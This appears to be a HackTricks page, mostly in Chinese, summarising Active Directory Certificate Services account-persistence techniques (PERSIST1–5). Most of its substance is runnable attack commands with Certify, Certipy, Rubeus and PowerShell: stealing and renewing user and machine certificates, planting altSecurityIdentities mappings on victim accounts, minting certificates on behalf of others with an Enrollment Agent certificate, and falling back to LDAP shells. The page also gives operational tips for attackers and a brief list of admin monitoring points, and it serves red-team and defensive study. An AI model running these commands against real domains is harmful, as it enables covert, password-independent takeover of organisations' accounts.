# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**这是对来自 [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) 的精彩研究中关于 account persistence 章节的简要总结**

## 理解使用 Certificates 的 Active User Credential Theft – PERSIST1

在一种场景中，如果用户可以请求一个允许 domain authentication 的 certificate，攻击者就有机会请求并窃取该 certificate，以便在网络中维持 persistence。默认情况下，Active Directory 中的 `User` template 允许此类请求，不过有时它可能会被禁用。

使用 [Certify](https://github.com/GhostPack/Certify) 或 [Certipy](https://github.com/ly4k/Certipy)，你可以搜索允许 client authentication 的已启用 templates，然后请求一个：
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
证书的强大之处在于，它能够以其所属用户的身份进行认证，而不受密码更改的影响，只要该证书仍然有效。

你可以将 PEM 转换为 PFX，并用它来获取 TGT：
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note: 结合其他 techniques（见 THEFT sections），基于 certificate 的 auth 允许持久访问，而无需接触 LSASS，甚至可以在非提升权限的 contexts 中使用。

## 使用 Certificates 获取 Machine 持久化 - PERSIST2

如果攻击者在主机上拥有 elevated privileges，他们可以使用默认的 `Machine` template 为被攻陷系统的 machine account 注册一个 certificate。以 machine 身份进行 authentication 可为本地 services 启用 S4U2Self，并可提供持久的 host persistence：
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## 通过证书续期扩展持久化 - PERSIST3

滥用证书模板的有效期和续期周期，可以让攻击者维持长期访问。如果你持有一个之前签发的证书及其私钥，你可以在到期前对其进行续期，以获取一个新的、长期有效的凭据，而不会留下与原始主体关联的额外请求痕迹。
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operational tip: 跟踪攻击者持有的 PFX 文件的有效期并提前续期。续期还可能让更新后的证书包含现代 SID mapping 扩展，使其在更严格的 DC mapping 规则下仍可用（见下一节）。

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

如果你可以写入目标账户的 `altSecurityIdentities` 属性，你就可以把一个攻击者控制的 certificate 显式映射到该账户。这个映射会在密码更改后仍然存在，并且在使用 strong mapping formats 时，在现代 DC 强制策略下仍然可用。

High-level flow:

1. 获取或签发一个你控制的 client-auth certificate（例如，以自己身份 enroll `User` template）。
2. 从 cert 中提取一个 strong identifier（Issuer+Serial、SKI 或 SHA1-PublicKey）。
3. 使用该 identifier 在受害者 principal 的 `altSecurityIdentities` 上添加一个显式 mapping。
4. 使用你的 certificate 进行 authenticate；DC 会通过显式 mapping 将其映射到受害者。

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
然后使用你的 PFX 进行认证。Certipy 将直接获取一个 TGT：
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### 构建强 `altSecurityIdentities` 映射

在实践中，**Issuer+Serial** 和 **SKI** 映射是从攻击者持有的证书构建强格式最简单的方法。这一点在 **2025 年 2 月 11 日** 之后尤其重要，因为 DC 会默认使用 **Full Enforcement**，而弱映射将不再可靠。
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- 只使用强映射类型：`X509IssuerSerialNumber`、`X509SKI` 或 `X509SHA1PublicKey`。弱格式（Subject/Issuer、仅 Subject、RFC822 email）已被弃用，并且可能被 DC 策略阻止。
- 该映射对 **user** 和 **computer** 对象都有效，因此只要能写入 computer account 的 `altSecurityIdentities`，就足以以该机器身份持久化。
- 证书链必须能构建到一个被 DC 信任的 root。NTAuth 中的 Enterprise CA 通常会被信任；某些环境也信任 public CAs。
- 即使 PKINIT 失败，只要 DC 缺少 Smart Card Logon EKU 或返回 `KDC_ERR_PADATA_TYPE_NOSUPP`，Schannel authentication 仍然有助于持久化。

#### 2025+ `Issuer/SID` explicit mappings

在打了 **2025 年 9 月 9 日** security update 的 **Windows Server 2022+** domain controllers 上，Microsoft 又添加了一种更强的 explicit mapping format；它很适合用于持久化，因为它在同一 CA 重新签发证书后仍然有效：
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operationally this differs from the older strong formats:
- `Issuer+Serial` 绑定 **一张精确的证书**。
- `SKI` / `SHA1-PUKEY` 绑定 **一对密钥**。
- `Issuer/SID` 绑定 **签发 CA + 目标 SID**，因此同一 CA 重新签发或续签的证书仍然可用，而无需重写 `altSecurityIdentities`。

Requirements and caveats
- 用于 logon 的证书必须在 SID security extension 中实际包含目标 account SID。
- 这种格式对省略 SID extension 的 `ESC9` / `ESC16` 风格证书没有帮助；在这些情况下，回退到 `Issuer+Serial`、`SKI` 或 `SHA1-PUKEY`。

For more on weak explicit mappings and attack paths, see:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
撤销 agent certificate 或 template permissions 才能清除这种持久化。

Operational notes
- 现代版本的 `Certipy` 同时支持 `-on-behalf-of` 和 `-renew`，因此持有 Enrollment Agent PFX 的攻击者可以签发并在之后续期 leaf certificates，而无需再次接触原始目标账户。
- 如果无法通过 PKINIT 获取 TGT，那么生成的 on-behalf-of certificate 仍然可以用于 Schannel authentication，命令如下：`certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`。

## Using Persisted Certificates When PKINIT Fails

如果 DC 没有 Smart Card Logon-capable certificate，基于 PKINIT 的 certificate logon 可能会失败并返回 `KDC_ERR_PADATA_TYPE_NOSUPP`。这并不意味着持久化 primitive 失效：同一个 PFX 通常仍然可以用于经过 Schannel authentication 的 LDAP access。
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
这在 PERSIST4/PERSIST5 之后尤其有用，因为你可以继续从 Linux/macOS 上操作，并串联其他目录持久化动作，例如投放 [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) 或编辑可写的 delegation 属性。

## 2025 强制 Certificate Mapping Enforcement：对持久化的影响

Microsoft KB5014754 在域控制器上引入了 Strong Certificate Mapping Enforcement。自 **2025 年 2 月 11 日** 起，DC 对于弱/模糊映射默认使用 **Full Enforcement**，并且自 **2025 年 9 月 9 日** 的安全更新起，已打补丁的 DC 不再支持旧的 Compatibility-mode 回退。实际影响如下：

- 缺少 SID mapping 扩展的 2022 年之前的证书，在 DC 处于 Full Enforcement 时可能会因隐式映射失败。攻击者可以通过 AD CS 续订证书（以获取 SID 扩展），或者在 `altSecurityIdentities` 中植入强显式映射（PERSIST4）来维持访问。
- 使用强格式（`Issuer+Serial`、`SKI`、`SHA1-PUKEY`，以及在现代 DC 上的 `Issuer/SID`）的显式映射仍然有效。弱格式（Issuer/Subject、仅 Subject、RFC822）可能会被阻止，不应用于持久化。
- 如果弱映射看起来仍然有效，应该假设你碰到的是未打补丁或配置不同的 DC，而不是一个可靠的长期持久化路径。
- 会抑制 SID 扩展的 `ESC9` / `ESC16` 风格签发路径会使 `Issuer/SID` 无法使用，因此回退到强映射，或通过正常模板续订，才是实际可行的持久化选项。

管理员应监控并告警以下内容：
- 对 `altSecurityIdentities` 的更改，以及 Enrollment Agent 和 User 证书的签发/续订。
- CA 签发日志中出现的 on-behalf-of 请求和异常续订模式。

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
